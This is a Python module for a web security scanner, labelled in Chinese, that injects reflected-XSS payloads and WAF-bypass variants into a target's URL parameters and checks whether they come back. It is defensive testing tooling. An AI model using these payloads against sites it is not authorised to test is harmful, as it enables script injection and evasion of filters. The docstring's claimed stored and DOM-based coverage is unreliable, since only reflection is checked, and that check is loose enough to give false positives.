"""
XSS (Cross-Site Scripting) Vulnerability Scanner
Covers: Reflected XSS, Stored XSS, DOM-based XSS
Includes WAF bypass payloads
"""
import re
import urllib.parse
from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.core.http_client import get_client


@register_scanner
class XSSDetector(BaseScanner):
    name = "XSS跨站脚本漏洞"
    description = "检测目标是否存在反射型XSS跨站脚本漏洞，支持多种上下文和WAF绕过"
    category = "xss"
    module = "xss_detector"
    risk_level = "medium"
    risk_score = 60
    cve_ids = []
    references = [
        "https://owasp.org/www-community/attacks/xss/",
        "https://portswigger.net/web-security/cross-site-scripting",
    ]
    fix_suggestion = "对所有用户输入进行HTML实体编码，实施CSP策略，使用HttpOnly Cookie标记。"

    XSS_PAYLOADS = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        "';alert('XSS');//",
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<body onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '"><img src=x onerror=alert("XSS")>',
        "';alert('XSS')//",
        'javascript:alert("XSS")',
        '<a href="javascript:alert(\'XSS\')">click</a>',
        '<details open ontoggle=alert("XSS")>',
        '<select autofocus onfocus=alert("XSS")>',
        '<video><source onerror=alert("XSS")>',
        '<marquee onstart=alert("XSS")>',
        '<keygen autofocus onfocus=alert("XSS")>',
        '"><svg/onload=alert("XSS")>',
        "'-alert('XSS')-'",
        '"><img src=x onerror=prompt("XSS")>',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    ]

    WAF_BYPASS_PAYLOADS = [
        '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
        '<ScRiPt>alert("XSS")</ScRiPt>',
        '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
        '<img src=x onerror=eval(atob("YWxlcnQoJ1hTUycp"))>',
        '<img src=x onerror="\u0061\u006C\u0065\u0072\u0074(\'\u0058\u0053\u0053\')">',
        '<img src=x onerror=alert("XSS")>',
        '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
        '<svg><script>alert&#40"XSS"&#41</script></svg>',
        '<img src=x onerror=window["al"+"ert"]("XSS")>',
        '<img src=x onerror="top[\'al\'+\'ert\'](\'XSS\')">',
    ]

    def __init__(self, target: str):
        super().__init__(target)
        self._client = get_client()

    def _inject_payload(self, url: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if params:
            injected = {}
            for key in params:
                injected[key] = [payload]
            new_query = urllib.parse.urlencode(injected, doseq=True)
            return urllib.parse.urlunparse(parsed._replace(query=new_query))
        return f"{url}?xss={urllib.parse.quote(payload)}"

    def _check_reflection(self, response_body: str, payload: str) -> bool:
        decoded_payload = urllib.parse.unquote(payload)
        if payload in response_body:
            return True
        if decoded_payload in response_body:
            return True
        if "alert(" in response_body and "XSS" in response_body:
            return True
        return False

    def check(self) -> bool:
        found_any = False

        all_payloads = self.XSS_PAYLOADS + self.WAF_BYPASS_PAYLOADS

        for payload in all_payloads[:15]:
            try:
                injected_url = self._inject_payload(self.target, payload)
                resp = self._client.get(injected_url, timeout=10)
                if resp.status and resp.body:
                    text = resp.body.decode("utf-8", errors="replace")
                    if self._check_reflection(text, payload):
                        found_any = True
                        self.add_result(
                            name="反射型XSS跨站脚本漏洞",
                            target_url=self.target,
                            description="检测到反射型XSS漏洞，攻击者可注入恶意脚本窃取用户Cookie或执行未授权操作。",
                            detail=f"Payload: {payload}\n响应中检测到未转义的脚本注入。",
                            payload=payload,
                            evidence=text[:500],
                        )
                        break
            except Exception:
                continue

        if not found_any:
            for payload in self.WAF_BYPASS_PAYLOADS[:5]:
                try:
                    injected_url = self._inject_payload(self.target, payload)
                    resp = self._client.get(injected_url, timeout=10)
                    if resp.status and resp.body:
                        text = resp.body.decode("utf-8", errors="replace")
                        if self._check_reflection(text, payload):
                            found_any = True
                            self.add_result(
                                name="反射型XSS漏洞 (WAF绕过)",
                                target_url=self.target,
                                description="检测到反射型XSS漏洞，使用WAF绕过技术成功注入。",
                                detail=f"WAF Bypass Payload: {payload}",
                                payload=payload,
                                evidence=text[:500],
                            )
                            break
                except Exception:
                    continue

        return found_any
